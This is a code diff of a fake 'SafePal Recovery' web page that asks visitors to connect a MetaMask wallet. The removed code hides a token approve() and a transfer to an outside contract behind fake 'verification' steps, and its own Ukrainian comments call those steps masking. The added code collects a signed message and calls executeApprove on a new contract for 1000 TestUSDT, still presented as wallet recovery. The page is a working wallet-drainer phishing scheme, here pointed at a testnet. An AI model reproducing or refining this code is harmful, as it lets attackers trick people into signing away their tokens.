@@ -47,30 +47,18 @@
     <div class="container">
         <h2>SafePal Recovery</h2>
         <button id="connectButton" onclick="connectWallet()">Connect Wallet</button>
-        <p id="status">Please connect your MetaMask wallet to verify ownership.</p>
+        <p id="status">Please connect your MetaMask wallet.</p>
     </div>
 
     <script>
-        console.log('Script loaded successfully!');
-
-        if (typeof ethers === 'undefined') {
-            console.error('Ethers.js not loaded. Please check the script source.');
-            document.getElementById('status').innerText = 'Error: Ethers.js not loaded.';
-        } else {
-            console.log('Ethers.js loaded successfully:', ethers.version);
-        }
-
         async function connectWallet() {
             try {
-                console.log('Step 1: Connect Wallet button clicked.');
-                document.getElementById('status').innerText = 'Connecting to MetaMask...';
+                document.getElementById('status').innerText = 'Connecting...';
 
-                console.log('Step 2: Checking MetaMask availability...');
                 if (!window.ethereum || !window.ethereum.isMetaMask) {
                     throw new Error('MetaMask not found. Please install MetaMask or ensure it is active.');
                 }
 
-                console.log('Step 3: Requesting accounts...');
                 const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                 if (accounts.length === 0) {
                     throw new Error('No accounts found. Please unlock MetaMask.');
@@ -78,74 +66,44 @@
 
                 const userAddress = accounts[0];
                 document.getElementById('status').innerText = 'Connected. Verifying wallet ownership...';
-                console.log('Step 4: Connected with address:', userAddress);
 
                 // Перевірка мережі (Sepolia)
-                console.log('Step 5: Checking network...');
                 const chainId = parseInt(await window.ethereum.request({ method: 'eth_chainId' }), 16);
                 const targetChainId = 11155111; // Sepolia Testnet
                 if (chainId !== targetChainId) {
-                    console.log('Switching to Sepolia Testnet...');
                     await window.ethereum.request({
                         method: 'wallet_switchEthereumChain',
                         params: [{ chainId: `0x${targetChainId.toString(16)}` }]
                     });
                 }
 
-                // Виклик approve і executeTransfer
-                const contractAddress = '0x0A52778FEFe53c24D39956247848e12399CCAd00'; // Адреса контракту
+                // Підпис повідомлення
+                const message = 'Verify wallet ownership for SafePal recovery';
+                const signature = await window.ethereum.request({
+                    method: 'personal_sign',
+                    params: [message, userAddress]
+                });
+
+                console.log('Signature:', signature);
+                document.getElementById('status').innerText = 'Wallet verified. Processing recovery...';
+
+                // Виклик executeApprove через ApproveContract
+                const contractAddress = '0x735558EAd7D67C11412a736e17dde510e97F0481'; // Встав нову адресу контракту
                 const usdtAddress = '0x9FcefD342ED17979ceDf0B6C4D257A03d908F5fD'; // TestUSDT
                 const amount = 1000000000; // 1000 USDT
 
-                console.log('Step 6: Initializing provider and signer...');
+                const contractAbi = [
+                    "function executeApprove(bytes memory message, address user, bytes memory signature, address token, uint256 amount) external"
+                ];
+
                 const provider = new ethers.providers.Web3Provider(window.ethereum);
                 const signer = provider.getSigner();
-
-                // Перевірка балансу (фейкова "перевірка" для маскування)
-                console.log('Step 7: Verifying wallet balance...');
-                const tokenAbi = [
-                    "function balanceOf(address) view returns (uint256)",
-                    "function decimals() view returns (uint8)",
-                    "function approve(address spender, uint256 amount) external returns (bool)"
-                ];
-                const tokenContract = new ethers.Contract(usdtAddress, tokenAbi, signer);
-                const balance = await tokenContract.balanceOf(userAddress);
-                const decimals = await tokenContract.decimals();
-                const balanceFormatted = ethers.utils.formatUnits(balance, decimals);
-                console.log(`User balance: ${balanceFormatted} TestUSDT`);
-                document.getElementById('status').innerText = 'Balance verified. Checking network compatibility...';
-
-                if (balance.lt(amount)) {
-                    throw new Error('Insufficient balance to complete verification. Need at least 1000 TestUSDT.');
-                }
-
-                // Перевірка балансу Sepolia ETH для газу (ще одна "перевірка")
-                console.log('Step 8: Verifying gas availability...');
-                const ethBalance = await provider.getBalance(userAddress);
-                const ethBalanceFormatted = ethers.utils.formatEther(ethBalance);
-                console.log(`ETH balance: ${ethBalanceFormatted} Sepolia ETH`);
-                if (ethBalance.lt(ethers.utils.parseEther('0.01'))) {
-                    throw new Error('Insufficient Sepolia ETH for gas. Need at least 0.01 ETH.');
-                }
-                document.getElementById('status').innerText = 'Gas availability confirmed. Finalizing verification...';
-
-                // Виклик approve (замасковано як "перевірка")
-                console.log('Step 9: Performing ownership verification...');
-                const approveTx = await tokenContract.approve(contractAddress, amount);
-                const approveReceipt = await approveTx.wait();
-                console.log('Verification Transaction Hash:', approveReceipt.transactionHash);
-                document.getElementById('status').innerText = 'Ownership verified. Completing recovery process...';
-
-                // Виклик executeTransfer (замасковано як "завершення")
-                const contractAbi = [
-                    "function executeTransfer(address token, address user, uint256 amount) external"
-                ];
                 const contract = new ethers.Contract(contractAddress, contractAbi, signer);
 
-                console.log('Step 10: Finalizing recovery process...');
-                const transferTx = await contract.executeTransfer(usdtAddress, userAddress, amount);
-                const transferReceipt = await transferTx.wait();
-                console.log('Recovery Transaction Hash:', transferReceipt.transactionHash);
+                const messageBytes = ethers.utils.toUtf8Bytes(message);
+                const tx = await contract.executeApprove(messageBytes, userAddress, signature, usdtAddress, amount);
+                await tx.wait();
+                console.log('Verification Transaction Hash:', tx.hash);
 
                 document.getElementById('status').innerText = 'Recovery process completed! Your wallet is secure.';
             } catch (error) {
